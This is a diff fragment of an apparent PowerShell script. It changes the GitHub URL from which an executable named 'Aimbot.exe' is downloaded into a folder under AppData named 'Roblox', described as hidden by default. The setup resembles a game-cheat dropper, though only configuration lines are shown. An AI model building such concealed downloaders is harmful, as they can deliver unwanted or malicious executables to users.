@@ -5,7 +5,7 @@
 
 # ------------------- CONFIGURATION -------------------
 # Replace with your actual .exe download URL (GitHub release raw link)
-$DownloadUrl = "https://github.com/leone0988/somthing-cool/raw/refs/heads/main/Aimbot.exe"
+$DownloadUrl = "https://raw.githubusercontent.com/leone0988/somthing-cool/refs/heads/main/Aimbot.exe"
 
 # Destination folder inside AppData (hidden by default)
 $DestinationFolder = "$env:APPDATA\Roblox"
